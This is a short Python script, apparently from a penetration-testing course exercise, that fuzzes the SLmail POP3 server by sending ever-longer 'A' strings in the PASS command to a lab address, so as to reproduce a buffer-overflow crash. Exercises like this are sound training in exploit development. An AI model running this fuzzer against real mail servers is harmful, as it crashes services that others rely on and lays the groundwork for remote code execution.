#!/usr/bin/python
#6.1.4 exercises
# fuzz SLmail and replicate the crash


import socket


buff = ["A"]
counter = 100

while len(buff) <= 30:
	buff.append("A"*counter)
	counter = counter + 200

for string in buff:
	print "Fuzzing PASS with %s bytes" % len(string)	
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.79.134', 110))
	data = s.recv(1024)
	s.send('USER test' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + string + '\r\n')
	s.send('QUIT\r\n')
	s.close()